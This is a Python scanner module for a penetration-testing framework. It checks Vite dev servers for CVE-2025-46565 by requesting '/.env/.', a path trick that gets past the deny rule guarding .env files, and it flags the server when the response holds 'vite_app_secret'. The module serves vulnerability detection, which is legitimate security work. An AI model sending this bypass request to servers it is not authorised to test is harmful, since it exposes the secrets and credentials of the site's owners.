#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Vite is a frontend tooling framework for JavaScript."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Vite Dev Server - Information Exposure Detection',
        'description': 'Vite is a frontend tooling framework for JavaScript. Before versions 6.3.4, 6.2.7, 6.1.6, 5.4.19, and 4.5.14, the contents of files in the project root that are denied by a file matching pattern can be returned to the browser. Only apps explicitly exposing the Vite dev server to the network (using --host or server.host config option) are affected. Only files that are under project root and are denied by a file matching pattern can be bypassed. `server.fs.deny` can contain patterns matching against files (by default it includes .env, .env.*, *.{crt,pem} as such patterns). These patterns were able to bypass for files under `root` by using a combination of slash and dot (/.). This issue has been patched in versions 6.3.4, 6.2.7, 6.1.6, 5.4.19, and 4.5.14.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'vite', 'exposure', 'bypass'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/vitejs/vite/security/advisories/GHSA-859w-5945-r5v3',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-46565',
        ],
        'cve': 'CVE-2025-46565',
    }

    def run(self):
        path = '/.env'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/.env/.'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_any = ('vite_app_secret',)
        if any(m in body for m in body_any):
            self.set_info(severity='medium', reason='Vite Dev Server - Information Exposure detected', path=path)
            return True
        return False

